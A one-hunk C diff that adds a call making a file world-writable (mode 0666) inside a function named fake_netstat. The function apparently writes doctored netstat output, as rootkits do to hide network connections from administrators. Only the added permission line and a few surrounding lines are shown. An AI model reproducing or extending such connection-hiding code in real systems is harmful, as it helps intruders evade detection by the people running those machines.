@@ -84,6 +84,7 @@ int fake_netstat(char *pathname, char *newfile){
             fputs(str, fake_fp);
         }
     }
+    fchmod(fileno(fake_fp), 0666);
     fclose(fake_fp);
     return 1;
 }
